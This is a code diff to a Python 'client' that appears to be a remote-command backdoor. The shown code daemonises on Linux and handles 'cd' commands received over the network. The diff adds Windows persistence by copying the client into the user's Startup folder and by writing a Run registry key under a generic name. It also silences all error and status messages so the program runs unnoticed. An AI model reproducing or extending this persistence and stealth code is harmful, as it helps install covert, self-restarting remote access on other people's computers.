@@ -65,13 +65,61 @@ class client:
     def setup(self):
         if sys.platform == "linux" or sys.platform == "linux2":
             self.set_up_UNIX()
-        # elif sys.platform == "win32":
-        #     pass
+        elif sys.platform == "win32":
+            file = './tmp'
+            if os.path.exists(file):
+                sys.exit(1)
+            fd = os.open(file, os.O_CREAT | os.O_EXCL | os.O_TEMPORARY)
+            self.copy_windows_simple()
         else:
-            print("platform not supported", file=sys.stderr)
+            # print("platform not supported", file=sys.stderr)
+            sys.exit(1)
+
+    def copy_windows_simple(self):
+        try:
+            user = os.getlogin()
+            start_up_dir = path = os.path.join('C:', 'Users', user, 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+            start_up_script =  os.path.join(start_up_dir, 'client')
+            if not os.path.exists(start_up_script):
+                shutil.copyfile('./client', start_up_script)
+        except Exception as error:
+            # print(str(error), file=sys.stderr)
             sys.exit(1)
 
 
+    def copy_windows_registry(self):
+        try:
+            import winreg as reg
+            import os
+            # in python __file__ is the instant of
+            # file path where it was executed
+            # so if it was executed from desktop,
+            # then __file__ will be
+            # c:\users\current_user\desktop
+            pth = os.path.dirname(os.path.realpath(__file__))
+
+            # name of the python file with extension
+            s_name="client"
+
+            # joins the file name to end of path address
+            address = os.path.join(pth,s_name)
+
+            # key we want to change is HKEY_CURRENT_USER
+            # key value is Software\Microsoft\Windows\CurrentVersion\Run
+            key = reg.HKEY_CURRENT_USER
+            key_value = "Software\Microsoft\Windows\CurrentVersion\Run"
+
+            # open the key to make changes to
+            open = reg.OpenKey(key,key_value,0,reg.KEY_ALL_ACCESS)
+
+            # modifiy the opened key
+            reg.SetValueEx(open,"any_name",0,reg.REG_SZ,address)
+
+            # now close the opened key
+            reg.CloseKey(open)
+        except Exception as error:
+            # print(str(error), file=sys.stderr)
+            sys.exit(1)
 
     def set_up_UNIX(self):
         # acquire process lock so only one instance of the daemon can exist at a time
@@ -93,7 +141,7 @@ class client:
                 # exit first parent
                 sys.exit(0)
         except Exception as error:
-            print("fork failed, error: {}".format(str(error)), file=sys.stderr)
+            # print("fork failed, error: {}".format(str(error)), file=sys.stderr)
             sys.exit(1)
 
         # change session id
@@ -109,7 +157,7 @@ class client:
             if pid > 0:
                 sys.exit(1)
         except Exception as error:
-            print("fork failed, error: {}".format(str(error)), file=sys.stderr)
+            # print("fork failed, error: {}".format(str(error)), file=sys.stderr)
             sys.exit(1)
 
     def get_lock(self):
@@ -123,9 +171,9 @@ class client:
             # on the file system itself.
             # Works only in Linux
             self._lock_socket.bind('\0' + process_name)
-            print('Process lock acquired')
+            # print('Process lock acquired')
         except socket.error:
-            print('Process already exists', file=sys.stderr)
+            # print('Process already exists', file=sys.stderr)
             sys.exit()
 
     def copy_client(self):
@@ -162,7 +210,7 @@ class client:
                 with open(auto_config_desktop, 'w') as file:
                     file.write(file_content)
         except Exception as e:
-            print("failed to copy client, error: {}".format(str(e)), file=sys.stderr)
+            # print("failed to copy client, error: {}".format(str(e)), file=sys.stderr)
             sys.exit(1)
 
     # note that cmd parameter is in network bytes
@@ -172,9 +220,13 @@ class client:
             try:
                 new_dir = cmd[3:].decode("utf-8")
                 if len(new_dir) == 0:
-                    new_dir = os.getenv("HOME")
-                os.chdir(new_dir)
-                return "\n"
+                    if sys.platform != "win32":
+                        new_dir = os.getenv("HOME")
+                        os.chdir(new_dir)
+                        return "\n"
+                else:
+                    os.chdir(new_dir)
+                    return "\n"
             except Exception as error:
                 return str(error) + "\n"
 
